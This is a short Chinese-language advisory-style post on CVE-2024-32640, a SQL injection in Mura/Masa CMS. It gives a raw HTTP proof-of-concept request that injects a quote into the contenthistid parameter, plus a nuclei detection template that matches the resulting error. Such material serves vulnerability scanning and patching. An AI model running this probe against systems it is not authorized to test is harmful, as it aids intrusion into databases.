## Mura-CMS-processAsyncObject存在SQL注入漏洞(CVE-2024-32640)

Mura CMS 是一个功能全面、灵活且用户友好的内容管理系统。2024年5月8日，互联网上披露其存在CVE-2024-32640 Mura CMS processAsyncObject SQL注入漏洞，攻击者可构造恶意请求获取数据库中的敏感信息。

## poc
```
 POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
 Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

object=displayregion&contenthistid=x\'&previewid=1
```

## nuclei
```
id: CVE-2024-32640

info:
  name: Mura/Masa CMS - SQL Injection
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    The Mura/Masa CMS is vulnerable to SQL Injection.
  reference:
    - https://blog.projectdiscovery.io/mura-masa-cms-pre-auth-sql-injection/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32640
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Apply the vendor-supplied patch or update to a secure version.
  metadata:
    verified: true
    max-request: 3
    vendor: masacms
    product: masacms
    shodan-query: 'Generator: Masa CMS'
  tags: cve,cve2022,sqli,cms,masa,masacms

http:
  - raw:
      - |
        POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        object=displayregion&contenthistid=x\'&previewid=1

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 500'
          - 'contains(header, "application/json")'
          - 'contains_all(body, "Unhandled Exception")'
          - 'contains_all(header,"cfid","cftoken")'
        condition: and
```
